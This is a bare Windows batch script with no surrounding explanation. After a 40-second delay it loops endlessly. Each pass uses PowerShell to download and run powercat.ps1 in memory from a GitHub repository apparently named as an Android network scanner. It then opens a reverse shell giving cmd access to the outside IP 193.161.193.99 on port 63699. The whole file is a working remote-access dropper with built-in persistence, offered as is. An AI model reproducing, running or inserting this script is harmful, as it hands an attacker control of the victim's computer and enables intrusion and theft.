@echo off 
cls
timeout 40
:start
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/wolfyy59/network_scan_android/main/powercat.ps1');powercat -c 193.161.193.99 -p 63699 -e cmd"
goto start